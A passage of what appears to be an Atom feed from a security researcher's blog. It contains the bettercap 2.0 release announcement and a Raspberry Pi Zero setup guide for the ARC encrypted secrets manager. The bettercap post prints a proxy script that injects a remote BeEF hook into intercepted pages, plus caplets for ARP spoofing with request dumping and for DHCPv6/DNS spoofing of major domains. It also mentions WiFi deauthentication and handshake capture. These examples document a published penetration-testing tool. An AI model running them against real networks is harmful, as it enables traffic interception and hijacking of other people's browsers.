&lt;p&gt;It’s important to say that some, if not most of the things I’m about to write are purely subjective and related to my programming habits, they do not necessarily represent so called “best practices” and should not be taken like so. Moreover, I’m still a Go noob, some of the things I’m going to say might just be inaccurate / wrong, in which case feel free to correct me and teach me something new, &lt;strong&gt;please&lt;/strong&gt; :D&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NOTE 2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Before we start: I love this language and I already explained why I still consider it a better choice for several applications, but I’m not interested in an opinion war about Go vs Rust, or Go vs whatever … use what you think it’s best for what you have to do: if that’s Rust go for it, if you think it’s binary code you send to the processor by using your nipples to inject faults into some data bus, go for it, both cases, code and let code, life is too short for being a language hipster.&lt;/p&gt;
    
    </summary>
    
    
      <category term="go" scheme="https://www.evilsocket.net/tags/go/"/>
    
      <category term="golang" scheme="https://www.evilsocket.net/tags/golang/"/>
    
      <category term="programming" scheme="https://www.evilsocket.net/tags/programming/"/>
    
      <category term="developing" scheme="https://www.evilsocket.net/tags/developing/"/>
    
      <category term="design patterns" scheme="https://www.evilsocket.net/tags/design-patterns/"/>
    
      <category term="oop" scheme="https://www.evilsocket.net/tags/oop/"/>
    
  </entry>
  
  <entry>
    <title>All Hail Bettercap 2.0, One Tool to Rule Them All.</title>
    <link href="https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/"/>
    <id>https://www.evilsocket.net/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/</id>
    <published>2018-02-27T19:37:20.000Z</published>
    <updated>2019-10-19T08:14:27.104Z</updated>
    
    <content type="html"><![CDATA[<p>It’s with immense pleasure that I announce the <a href="https://github.com/bettercap/bettercap/releases/tag/v2.0.0" target="_blank" rel="noopener">release of the second generation of bettercap</a>, a complete reimplementation of the most complete and advanced Man-in-the-Middle attack framework. This release not only brings MITM attacks to the next level, but it aims to be the reference framework for network monitoring (we &lt;3 blueteams too), 802.11, BLE attacks and more! :D</p>
<center><br><strong style="font-size:25px"><br>ベッターキャップ！<br></strong><br><img width="200px" src="https://www.bettercap.org/img/logo.png"><br></center>

<a id="more"></a>
<p>The first thing I want to mention is the <a href="https://github.com/orgs/bettercap/people" target="_blank" rel="noopener">amazing team</a> that helped me debugging during endless sessions on Windows, or implemented new features that changed the tool radically, or tested, or gave ideas, or reported bugs (on GitHub, not on Twitter -.-) … <strong>you guys rock</strong> and I am so lucky, <strong>thank you</strong>.</p>
<p>Let’s get started :D</p>
<h3 id="Performances"><a href="#Performances" class="headerlink" title="Performances"></a>Performances</h3><p>As who’s following either me or <a href="https://twitter.com/bettercap" target="_blank" rel="noopener">bettercap</a> itself on Twitter probably knows, the biggest change has been in the underlying technology and framework that bettercap relies upon, we switched from a Ruby application, to a compiled Go application and this increased performances tremendously for several reasons. </p>
<p>First, we’re not victims of a <a href="https://en.wikipedia.org/wiki/Global_interpreter_lock" target="_blank" rel="noopener">GIL</a> anymore, this plus Go’s amazing concurrency mechanisms allowes bettercap 2.0 to run on low end hardware and still keep proxying hundreds of connections per second and forwarding tens of hundres of packets, while the previous version had an average of 5-6 connections/s due to how I/O requests were pooled by the interpreter while locking (aka the GIL sucks, a lot). Long story short, <strong>no more unwanted network DoS when performing a MITM attack</strong>!! F YEAH! <em>- put cool ninja move here -</em></p>
<p>Also memory and CPU usage now are extremely optimized, you can run several instances of bettercap on your Raspberry Pi (or laptop, or router, or whatever … quite literally) and your CPU cores won’t even get to 20% unless you’re attacking a huge subnet … you can monitor LAN events in real time, while scanning for WiFi access points, while attacking BLE devices nearby and all at the same time, super fast, on low end hardware … but more on this later.</p>
<p><strong>TL;DR:</strong> FU Ruby, Go is amazing, fast and scales exceptionally well. </p>
<h3 id="Ease-of-installation-and-Portability"><a href="#Ease-of-installation-and-Portability" class="headerlink" title="Ease of installation and Portability"></a>Ease of installation and Portability</h3><p>Needless to say, having <strong>a single binary with zero dependencies</strong> (or just libpcap.so on some platforms, thing that will be solved with a full static build soon) that you can just drop on a router/server/whatever and run is way better than the whole rubygems/rvm/rubyenv/whateverbs mess, while if you want to update to bleeding edge, all you have to do is install Go and then <code>go get -u github.com/bettercap/bettercap</code> … how freaking cool is that? :D</p>
<p>Oh … and this new version supports <strong>Windows, macOS, Android, Linux (arm, mips, mips64, etc)</strong> and soon iOS ^_^</p>
<h3 id="Old-but-brand-new"><a href="#Old-but-brand-new" class="headerlink" title="Old but brand new."></a>Old but brand new.</h3><p>The useful features of the old version have been ported to this new one and you will find them as <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="noopener">session modules</a> (really, RTFM, I spent hours writing that shit), so you’ll have <code>net.recon</code> searching for new hosts on your network while <code>net.probe</code> will keep probing for new ones, there’s our old friend <code>arp.spoof</code> with his buddies <code>tcp.proxy</code>, <code>http.proxy</code> and  <code>https.proxy</code> (now <strong>all proxies are scriptable in Javascript</strong>) with some new <code>dhcp6.spoof</code> friend. You have the <code>net.sniff</code>er of course, a <code>syn.scan</code>ner if you need and several other core modules you can use to script your interactive session while the <code>events.stream</code> will flow in front of you :D</p>
<p>Talking about scripting, as I said proxy modules are easily scriptable in JS:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onLoad</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    log( <span class="string">"BeefInject loaded."</span> );</span><br><span class="line">    log(<span class="string">"targets: "</span> + env[<span class="string">'arp.spoof.targets'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onResponse</span>(<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>( res.ContentType.indexOf(<span class="string">'text/html'</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">        <span class="keyword">var</span> body = res.ReadBody();</span><br><span class="line">        <span class="keyword">if</span>( body.indexOf(<span class="string">'&lt;/head&gt;'</span>) != <span class="number">-1</span> ) &#123;</span><br><span class="line">            res.Body = body.replace( </span><br><span class="line">                <span class="string">'&lt;/head&gt;'</span>, </span><br><span class="line">                <span class="string">'&lt;script type="text/javascript" src="http://beef-server:3000/hook.js"&gt;&lt;/script&gt;&lt;/head&gt;'</span> </span><br><span class="line">            ); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Also, now we have “caplets”, which are basically like metasploit <code>.rc</code> files … enough ugly shell scripts because we don’t remember the command line for every attack scenario, now you can save your commands as <code>.cap</code> files and load them from your interactive session, let’s see a couple of interesting examples :D</p>
<p><code>http-req-dump.cap</code></p>
<p>Execute an ARP spoofing attack on the whole network (by default) or on a host (using <code>-eval</code> as described), intercept HTTP and HTTPS requests with the <code>http.proxy</code> and <code>https.proxy</code> modules and dump them using the <code>http-req-dumsp.js</code> proxy script.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># targeting the whole subnet by default, to make it selective:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#   sudo ./bettercap -caplet caplets/http-req-dump.cap -eval "set arp.spoof.targets 192.168.1.64"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># to make it less verbose</span></span><br><span class="line"><span class="comment"># events.stream off</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># discover a few hosts </span></span><br><span class="line">net.probe on</span><br><span class="line">sleep 1</span><br><span class="line">net.probe off</span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to enable sniffing too</span></span><br><span class="line"><span class="comment"># set net.sniff.verbose false</span></span><br><span class="line"><span class="comment"># set net.sniff.local true</span></span><br><span class="line"><span class="comment"># set net.sniff.filter tcp port 443</span></span><br><span class="line"><span class="comment"># net.sniff on</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># we'll use this proxy script to dump requests</span></span><br><span class="line"><span class="built_in">set</span> https.proxy.script caplets/http-req-dump.js</span><br><span class="line"><span class="built_in">set</span> http.proxy.script caplets/http-req-dump.js</span><br><span class="line">clear</span><br><span class="line"></span><br><span class="line"><span class="comment"># go ^_^</span></span><br><span class="line">http.proxy on</span><br><span class="line">https.proxy on</span><br><span class="line">arp.spoof on</span><br></pre></td></tr></table></figure>
<p><code>netmon.cap</code></p>
<p>An example of how to use the <code>ticker</code> module, use this caplet to monitor activities on your network.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># clear the screen and show data every second</span></span><br><span class="line"><span class="comment"># this will create a nice animation of your</span></span><br><span class="line"><span class="comment"># network activity</span></span><br><span class="line"><span class="built_in">set</span> ticker.commands <span class="string">"clear; net.show; events.show 20"</span></span><br><span class="line">ticker on</span><br><span class="line"></span><br><span class="line">net.probe on</span><br></pre></td></tr></table></figure>
<p><code>airodump.cap</code></p>
<p>Same as <code>netmon.cap</code> but will monitor for WiFi access points and clients instead of network hosts.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># let's add some api :D</span></span><br><span class="line">include caplets/rest-api.cap</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> $ &#123;by&#125;&#123;fw&#125;&#123;env.iface.name&#125;&#123;reset&#125; &#123;bold&#125;» &#123;reset&#125;</span><br><span class="line"><span class="built_in">set</span> ticker.commands clear; wifi.show; net.show; events.show 20</span><br><span class="line"></span><br><span class="line"><span class="comment"># uncomment to disable channel hopping</span></span><br><span class="line"><span class="comment"># set wifi.recon.channel 1</span></span><br><span class="line"></span><br><span class="line">wifi.recon on</span><br><span class="line">ticker on</span><br><span class="line">events.clear</span><br><span class="line">clear</span><br></pre></td></tr></table></figure>
<p><code>mitm6.cap</code></p>
<p><a href="https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/" target="_blank" rel="noopener">Reroute IPv4 DNS requests by using DHCPv6 replies</a>, start a HTTP server and DNS spoofer for <code>microsoft.com</code> and <code>google.com</code> (works against Windows 10 ^_^):</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># let's spoof Microsoft and Google ^_^</span></span><br><span class="line"><span class="built_in">set</span> dns.spoof.domains microsoft.com, google.com</span><br><span class="line"><span class="built_in">set</span> dhcp6.spoof.domains microsoft.com, google.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># every request http request to the spoofed hosts will come to us</span></span><br><span class="line"><span class="comment"># let's give em some contents</span></span><br><span class="line"><span class="built_in">set</span> http.server.path caplets/www</span><br><span class="line"></span><br><span class="line"><span class="comment"># serve files</span></span><br><span class="line">http.server on</span><br><span class="line"><span class="comment"># redirect DNS request by spoofing DHCPv6 packets</span></span><br><span class="line">dhcp6.spoof on</span><br><span class="line"><span class="comment"># send spoofed DNS replies ^_^</span></span><br><span class="line">dns.spoof on</span><br><span class="line"></span><br><span class="line"><span class="comment"># set a custom prompt for ipv6</span></span><br><span class="line"><span class="built_in">set</span> $ &#123;by&#125;&#123;fw&#125;&#123;cidr&#125; &#123;fb&#125;&gt; &#123;env.iface.ipv6&#125; &#123;reset&#125; &#123;bold&#125;» &#123;reset&#125;</span><br><span class="line"><span class="comment"># clear the events buffer and the screen</span></span><br><span class="line">events.clear</span><br><span class="line">clear</span><br></pre></td></tr></table></figure>
<p>These are just a few basic examples, I strongly encourage you to check the <a href="https://github.com/bettercap/caplets" target="_blank" rel="noopener">caplets repository</a>.</p>
<h3 id="WiFi-BLE-and-more-to-come"><a href="#WiFi-BLE-and-more-to-come" class="headerlink" title="WiFi, BLE and more to come!"></a>WiFi, BLE and more to come!</h3><p>There’s a brand new <code>wifi.recon</code> module that will either stick to a channel or perform channel hopping, both for 2.4Ghz and 5.0Ghz frequencies, reporting useful information on what’s going on at the <strong>802.11</strong> layer, the <code>wifi.deauth</code> module will deauth clients (doh!) while the <code>net.sniff</code>er will capture WPA2 handshakes (<strong>bye bye kismet, airodump, airmon, wifite</strong>, etc!). Meanwhile, the <code>ble.recon</code> will discover every <strong>Bluetooth Low Energy</strong> device you might want to inspect with <code>ble.enum</code> or fuzz with <code>ble.write</code>. Also <code>wifi.fuzz</code> and <code>ble.fuzz</code> modules are work in progress, as well as <code>sdr.*</code> modules and others.</p>
<p>Did I mention that this works on macOS and Windows too? :D Oh, and probably your macOS has <a href="https://twitter.com/bettercap/status/967453847114407936" target="_blank" rel="noopener">a WiFi card capable of monitor mode and frames injection already</a> :D This release is taking everything to the next level, we’re not just in the ethernet, <strong>we are everywhere</strong>.</p>
<h3 id="Habemus-API"><a href="#Habemus-API" class="headerlink" title="Habemus API"></a>Habemus API</h3><p>I believe this is functionally the biggest change, or at least the one with the biggest potential: <strong>we finally have a <a href="https://github.com/bettercap/bettercap/wiki/api.rest" target="_blank" rel="noopener">REST API</a>!</strong> Imagine having a mobile client for your bettercap instance running in your dropbox, or simply imagine to develop a mobile application just by launching the Android executable, using the <code>http.server</code> module itself to serve a web UI and just create a WebView to render it … boom, easy mobile baby! :D</p>
<p>You can read every single bit of information, you can have per IP realtime network statistics, you can send commands, wait for events … the sky is the limit!!! <em>-put evil laugh here-</em></p>
<center><br><blockquote class="twitter-tweet" data-lang="en"><p lang="en" dir="ltr">There&#39;s power on that USB … kismet on a drone ftw <a href="https://t.co/CbeeyL0QtZ" target="_blank" rel="noopener">pic.twitter.com/CbeeyL0QtZ</a></p>&mdash; 🦄 (@evilsocket) <a href="https://twitter.com/evilsocket/status/941320272728264705?ref_src=twsrc%5Etfw" target="_blank" rel="noopener">December 14, 2017</a></blockquote><br><script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><br></center>

<p>I’m so looking forward to see what users will create with this API, <strong>no more ugly Python wrappers</strong>, <strong>no more parsing complicated log files</strong>! F YEAH!!!</p>
<p>Well, that’s it … everything &lt; 2.0.0 is deprecated and not supported anymore, developement <a href="https://github.com/bettercap" target="_blank" rel="noopener">moved here</a> and there’s a <a href="https://github.com/bettercap/bettercap/wiki" target="_blank" rel="noopener">pretty decent documentation</a> that’ll help you getting started … as usual, <strong>enjoy</strong> :)</p>
<p><img src="https://abs.twimg.com/emoji/v2/72x72/1f984.png"></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;It’s with immense pleasure that I announce the &lt;a href=&quot;https://github.com/bettercap/bettercap/releases/tag/v2.0.0&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;release of the second generation of bettercap&lt;/a&gt;, a complete reimplementation of the most complete and advanced Man-in-the-Middle attack framework. This release not only brings MITM attacks to the next level, but it aims to be the reference framework for network monitoring (we &amp;lt;3 blueteams too), 802.11, BLE attacks and more! :D&lt;/p&gt;
&lt;center&gt;&lt;br&gt;&lt;strong style=&quot;font-size:25px&quot;&gt;&lt;br&gt;ベッターキャップ！&lt;br&gt;&lt;/strong&gt;&lt;br&gt;&lt;img width=&quot;200px&quot; src=&quot;https://www.bettercap.org/img/logo.png&quot;&gt;&lt;br&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="bettercap" scheme="https://www.evilsocket.net/tags/bettercap/"/>
    
      <category term="2" scheme="https://www.evilsocket.net/tags/2/"/>
    
      <category term="release" scheme="https://www.evilsocket.net/tags/release/"/>
    
      <category term="go" scheme="https://www.evilsocket.net/tags/go/"/>
    
      <category term="golang" scheme="https://www.evilsocket.net/tags/golang/"/>
    
      <category term="mitm" scheme="https://www.evilsocket.net/tags/mitm/"/>
    
      <category term="network" scheme="https://www.evilsocket.net/tags/network/"/>
    
      <category term="wifi" scheme="https://www.evilsocket.net/tags/wifi/"/>
    
      <category term="ble" scheme="https://www.evilsocket.net/tags/ble/"/>
    
  </entry>
  
  <entry>
    <title>DIY Portable Secrets Manager With a Raspberry Pi Zero and ARC</title>
    <link href="https://www.evilsocket.net/2017/12/07/DIY-Portable-Secrets-Manager-with-a-RPI-Zero-and-the-ARC-Project/"/>
    <id>https://www.evilsocket.net/2017/12/07/DIY-Portable-Secrets-Manager-with-a-RPI-Zero-and-the-ARC-Project/</id>
    <published>2017-12-07T16:42:48.000Z</published>
    <updated>2019-10-19T08:14:27.105Z</updated>
    
    <content type="html"><![CDATA[<p>For the last few days I’ve been working on a new project which I developed for very specific needs and reasons:</p>
<ol>
<li>I need to store safely (encrypted) my passwords, sensitive files, notes, etc.</li>
<li>I need to access them from anywhere, with every possible device ( desktop, mobile, terminal ).</li>
<li>I need those objects to be syncronized accros all my devices.</li>
<li>I don’t want to use “the cloud”.</li>
<li>I don’t want to pay for a server.</li>
<li>I don’t want to enable port forwarding and host it myself with DynDNS or alikes.</li>
</ol>
<p>So I wrote <strong>ARC</strong>.</p>
<p><img src="https://i.imgur.com/NvLlafA.png" alt="arcd"></p>
<a id="more"></a>
<p>Of course there are <strong>plenty</strong> of solutions already that mostly involve the use of <code>pass</code>, <code>ssh</code>, <code>git</code> and various synchronizations hacks, but:</p>
<ol>
<li>Either you’ll host that stuff on github ( “the cloud” ), or you’ll need a server.</li>
<li>You will need a terminal to access that data or complex procedures … good luck when you’re in a hurry and only have your phone.</li>
<li>The type of data you can store and access and the interactions you have with it are very limited.</li>
</ol>
<p>The approach I decided to try is different.</p>
<p><img src="https://i.imgur.com/EkxdwVH.jpg" alt="rpiz"></p>
<p>Arc is a manager for your secrets made of <code>arcd</code>, a RESTful API server written in Go which exposes read and write primitives for <strong>encrypted records</strong> on a sqlite database file.</p>
<p><img src="https://i.imgur.com/swC00gX.png" alt="arcd"></p>
<p>And <code>arc</code>, the client application implemented in html5 and javascript, which runs in every html5 enabled browser and  it is served by <code>arcd</code> itself.</p>
<p><img src="https://pbs.twimg.com/media/DQN8W1KWsAEP6bd.jpg:large" alt="multikey"></p>
<p>Records are generated, encrypted and decrypted <strong>client side only</strong> (Arc relies on CryptoJS for its AES encryption and the PRNG) by <code>arc</code>, which offers an intuitive management system equipped with UI widgets including:</p>
<ul>
<li>Simple text inputs.</li>
<li>Simple text areas.</li>
<li>Custom file attachments (<strong>files are encrypted client side</strong> before being uploaded as binary records).</li>
<li>A markdown editor area with preview and full screen mode.</li>
<li>A password field with <strong>password strength estimation</strong> and a <strong>random password generator</strong>. </li>
</ul>
<p>Elements can be created (with optional expiration dates), arranged and edited using <code>arc</code> and are stored on <code>arcd</code> safely.</p>
<ul style="margin:0; padding:0; list-style-type:none;"><br><li style="float: left; margin-right:15px; width:45%;"><br>    <img src="https://i.imgur.com/KCn4RGw.png"><br>    <small>A client side encrypted record set to expire and self delete with a markdown area and a password widget.</small><br></li><br><li style="float: left; margin-right:15px; width:45%;"><br>    <img src="https://i.imgur.com/nxqmRqY.png"><br>    <small>Markdown and various attached files.</small><br></li><br></ul>

<div style="clear:both;"></div>

<p>The idea is to use <em>the Arc</em>&trade; as a single manager for your passwords, encrypted notes, files and <code>-all the secret things here-</code> while hosting <code>arcd</code> yourself on some spare hardware like a Raspberry Pi and accessing <code>arc</code> from every device with a modern browser, so let’s see how to configure it on a Raspberry Pi Zero in order to have a secure and portable setup for your secrets! :D</p>
<h3 id="Hardware-Setup"><a href="#Hardware-Setup" class="headerlink" title="Hardware Setup"></a>Hardware Setup</h3><pre><code>The following instructions are Raspberry Pi Zero specific, but the same procedure should work on any similar hardware ( like another RPi or the USB Armory for instance ), the RPiZ is just what I found to be more convenient and cheap.
</code></pre><p>First of all, format a micro sd card and install Raspbian on it as usual (download iso, verify, dd, mount), next we need to apply a few tweaks in order to enable ethernet connectivity over its USB port.</p>
<p>With the RPi <code>boot</code> partition mounted, edit the <code>/path/to/pi/boot/config.txt</code> and append:</p>
<pre><code>dtoverlay=dwc2
</code></pre><p>Then edit <code>/path/to/pi/boot/cmdline.txt</code> and insert between the <code>rootwait</code> and the <code>quiet</code> parameters:</p>
<pre><code>modules-load=dwc2,g_ether
</code></pre><p>Eventually your <code>cmdline.txt</code> file will look like this:</p>
<pre><code>dwc_otg.lpm_enable=0 console=serial0,115200 console=tty1 root=PARTUUID=abcdefab-01 rootfstype=ext4 elevator=deadline fsck.repair=yes rootwait modules-load=dwc2,g_ether 
</code></pre><p>At last, we need to make Raspbian enable SSH on boot so we’ll be able to connect to it if needed, in order to do this just create an <code>/path/to/pi/boot/ssh</code> empty file.</p>
<p>Unmount the micro sd, insert it into the RPiZ and plug it to the computer <strong>using the USB data port</strong> (not the charge one, we don’t need it ;)).</p>
<p>If everything went fine, your computer should now detect a new network interface, in order to connect to it just assign it any static IP address ( on <code>Ubuntu</code> and similar, set the connection type to <code>Link-Local Only</code>), restart the interface and the RPiZ should be reachable:</p>
<pre><code>ping raspberrypi.local
</code></pre><p>Let’s finish the setup of the board, connect to it via SSH:</p>
<pre><code>ssh pi@raspberrypi.local
</code></pre><p>Expand the filesystem as usual, <strong>change the default SSH password</strong>, enable <strong>private key only SSH authentication</strong>, copy your certificate, etc … as for the hardware part, we’re ready :)</p>
<h3 id="Software-Setup"><a href="#Software-Setup" class="headerlink" title="Software Setup"></a>Software Setup</h3><p>The easiest way for now is to build the <code>arcd</code> server directly on a Raspberry Pi in order to produce an <code>ARMv6</code> binary, once you installed Go on the RPi (not necessarily the one you’re going to use as the secrets store) just <a href="https://github.com/evilsocket/arc#usages://github.com/evilsocket/arc#usage" target="_blank" rel="noopener">follow the instructions on the repository</a> to compile the server.</p>
<p>Once you compiled it, edit the configuration file:</p>
<pre><code>cd /path/to/arc/repo/arcd
cp sample_config.json config.json
vim config.json
</code></pre><p>And change the <code>address</code> field so we’ll be able to connect to the Arc web interface:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"address"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"port"</span>: <span class="number">8080</span>,</span><br><span class="line">    <span class="attr">"username"</span>: <span class="string">"PUT_YOUR_USERNAME_HERE"</span>,</span><br><span class="line">    <span class="attr">"password"</span>: <span class="string">"PUT_YOUR_PASSWORD_HERE"</span>,</span><br><span class="line">    <span class="attr">"database"</span>: <span class="string">"~/arc.db"</span>,</span><br><span class="line">    <span class="attr">"token_duration"</span>: <span class="number">60</span>,</span><br><span class="line">    <span class="attr">"scheduler"</span>: &#123;</span><br><span class="line">        <span class="attr">"enabled"</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">"period"</span>: <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"tls"</span>: &#123;</span><br><span class="line">        <span class="attr">"enabled"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"pem"</span>: <span class="string">"/some/file.pem"</span>,</span><br><span class="line">        <span class="attr">"key"</span>: <span class="string">"/some/file.key"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now just copy the <code>arc</code> folder, the new <code>config.json</code> file and the ARM compiled <code>arcd</code> server to the RPiZ:</p>
<pre><code>scp -r arc arcd_arm config.json pi@raspberrypi.local:/home/pi/
</code></pre><p>SSH to the board and make sure that everything works:</p>
<pre><code>ssh pi@raspberrypi.local
mv arcd_arm arcd
./arcd -config config.json -app arc
</code></pre><p>Open the browser and go to <code>http://raspberrypi.local:8080/</code>, you should now be able to login and use ARC whenever you plug your RPi Zero to the USB port :)</p>
<p>( Make sure to start <code>arcd</code> at boot by editing <code>/etc/rc.local</code> or whatever )</p>
<h3 id="Security-considerations"><a href="#Security-considerations" class="headerlink" title="Security considerations"></a>Security considerations</h3><ul>
<li><p>It should be obvious, but physically isolated data on dedicated hardware is safer.</p>
</li>
<li><p>All the data is encrypted client side, which means everything that is stored physically on the RPiZ is encrypted with <code>AES</code>, make sure to use a strong encryption key, the stronger the key, the safer the data will be in case you lose the hardware.</p>
</li>
<li><p>For additional security, you might store the <code>arc.db</code> server database on a LUKS volume which you will need to manually unlock at boot.</p>
</li>
<li><p>You should generate your own self signed certificate and use it in the <code>tls</code> configuration of Arc in order to use https instead of http.</p>
</li>
<li><p><strong>DO NOT</strong> enable any type of connection sharing from your computer to the RPiZ, we <strong>do not want</strong> anything from the outside world to reach our secure storage, ideally you should disable the wireless interface too if using the <code>W</code> model.</p>
</li>
<li><p>Username and password are needed to access the API itself, but they will <strong>not</strong> decrypt the records, that’s why the encryption key is requested as well. You can login with the same API credentials but different encryption keys, you will create records with a new key and will not be able to decrypt other records that have been created with a different AES key.</p>
</li>
<li><p>Elements can be configured with an expiration date, using it is a good way to remember how old a given password is and have some sort of reminder when it’s time to change it (or just encrypted reminders ^_^).</p>
</li>
</ul>
<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>The project is <a href="https://github.com/evilsocket/arc" target="_blank" rel="noopener">available on my github</a> as usual, there’s still <a href="https://github.com/evilsocket/arc/milestone/1" target="_blank" rel="noopener">some work left to do</a> before it reaches the first stable release, but I’m close :)</p>
<p>Stay safe, have fun and …</p>
<p align="center"><br>    <img src="https://i.imgur.com/h5cpCeN.png" alt="Encrypt all the things!"><br></p>

<h3 id="One-last-thing-…"><a href="#One-last-thing-…" class="headerlink" title="One last thing …"></a>One last thing …</h3><p>Yes, it works with smartphones and tablets in OTG mode :)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;For the last few days I’ve been working on a new project which I developed for very specific needs and reasons:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I need to store safely (encrypted) my passwords, sensitive files, notes, etc.&lt;/li&gt;
&lt;li&gt;I need to access them from anywhere, with every possible device ( desktop, mobile, terminal ).&lt;/li&gt;
&lt;li&gt;I need those objects to be syncronized accros all my devices.&lt;/li&gt;
&lt;li&gt;I don’t want to use “the cloud”.&lt;/li&gt;
&lt;li&gt;I don’t want to pay for a server.&lt;/li&gt;
&lt;li&gt;I don’t want to enable port forwarding and host it myself with DynDNS or alikes.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So I wrote &lt;strong&gt;ARC&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.imgur.com/NvLlafA.png&quot; alt=&quot;arcd&quot;&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="go" scheme="https://www.evilsocket.net/tags/go/"/>
    
      <category term="golang" scheme="https://www.evilsocket.net/tags/golang/"/>
    
      <category term="oss" scheme="https://www.evilsocket.net/tags/oss/"/>
    
      <category term="arc" scheme="https://www.evilsocket.net/tags/arc/"/>
    
      <category term="arcd" scheme="https://www.evilsocket.net/tags/arcd/"/>
    
      <category term="passwords" scheme="https://www.evilsocket.net/tags/passwords/"/>
    
      <category term="secrets" scheme="https://www.evilsocket.net/tags/secrets/"/>
    
      <category term="notes" scheme="https://www.evilsocket.net/tags/notes/"/>
    
      <category term="password manager" scheme="https://www.evilsocket.net/tags/password-manager/"/>
    
      <category term="encryption" scheme="https://www.evilsocket.net/tags/encryption/"/>
    
      <category term="aes" scheme="https://www.evilsocket.net/tags/aes/"/>
    
  </entry>
  
  <entry>
    <title>This Is Not a Post About BLE, Introducing BLEAH</title>
    <link href="https://www.evilsocket.net/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/"/>
    <id>https://www.evilsocket.net/2017/09/23/This-is-not-a-post-about-BLE-introducing-BLEAH/</id>
    <published>2017-09-23T15:06:56.000Z</published>
    <updated>2019-10-19T08:14:27.112Z</updated>
    
